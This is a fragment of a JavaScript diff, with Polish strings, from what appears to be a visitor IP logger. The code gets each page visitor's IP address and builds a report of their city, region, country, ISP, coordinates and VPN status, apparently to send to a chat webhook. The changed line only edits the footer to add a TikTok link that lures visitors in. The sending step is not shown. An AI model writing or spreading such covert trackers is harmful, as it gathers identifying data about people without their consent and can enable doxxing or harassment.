@@ -17,7 +17,7 @@ fetch('https://api.ipify.org?format=json')
             title: "Nowe wejście na stronę",
             description: `Adres IP: **${ip}**\nMiasto: ${ipinfo.city || 'Brak'}\nRegion: ${ipinfo.region || 'Brak'}\nKraj: ${ipinfo.country || 'Brak'}\nISP: ${ipinfo.org || 'Brak'}\nLokacja: ${ipinfo.loc || 'Brak'}\nVPN: ${vpn}`,
             color: 5814783,
-            footer: { text: "twoje ip nie zostanie upulicznione! | robię to 4fun!" },
+            footer: { text: "twoje ip nie zostanie upulicznione! | robię to 4fun! | kliknięto z linku [tiktok_itz_arbuz4](https://www.tiktok.com/@itzz_arbuz4/video/7571758510245956886) " },
             timestamp: new Date().toISOString()
           }]
         };
